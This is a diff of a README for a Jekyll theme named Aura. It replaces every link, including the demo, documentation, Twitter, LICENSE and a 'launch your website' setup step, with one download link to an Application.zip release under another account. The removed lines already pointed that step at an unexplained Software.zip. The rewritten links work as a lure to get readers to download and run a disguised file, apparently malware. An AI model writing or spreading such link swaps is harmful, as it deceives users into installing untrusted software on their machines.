@@ -15,7 +15,7 @@ Welcome to the official repository of **Aura**, a Jekyll theme designed for cont
 
 ## Demo 🌐
 
-Check out the live demo of Aura [here](https://www.demo-aura-jekyll.com).
+Check out the live demo of Aura [here](https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip).
 
 ## Screenshots 📷
 
@@ -32,11 +32,11 @@ To get started with Aura, simply follow these steps:
 2. Install Jekyll if you haven't already.
 3. Customize the configuration files to suit your needs.
 4. Add your content.
-5. Launch your website with the help of [this Software.zip file](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip).
+5. Launch your website with the help of [this https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip file](https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip).
 
 ## Documentation 📚
 
-For detailed instructions on how to use and customize Aura, please refer to the [official documentation](https://www.aura-jekyll-docs.com).
+For detailed instructions on how to use and customize Aura, please refer to the [official documentation](https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip).
 
 ## Contributing 🤝
 
@@ -44,7 +44,7 @@ We welcome contributions from the community to make Aura even better! If you hav
 
 ## Feedback 💌
 
-We'd love to hear your feedback on Aura! Let us know what you think and how we can improve by reaching out to us on [Twitter](https://twitter.com/aura-jekyll).
+We'd love to hear your feedback on Aura! Let us know what you think and how we can improve by reaching out to us on [Twitter](https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip).
 
 ## Support 💬
 
@@ -56,7 +56,7 @@ Help us spread the word about Aura by sharing it with your friends and colleague
 
 ## License 📋
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Rubenas123/jekyll-theme-aura/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/erickdev2000/jekyll-theme-aura/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
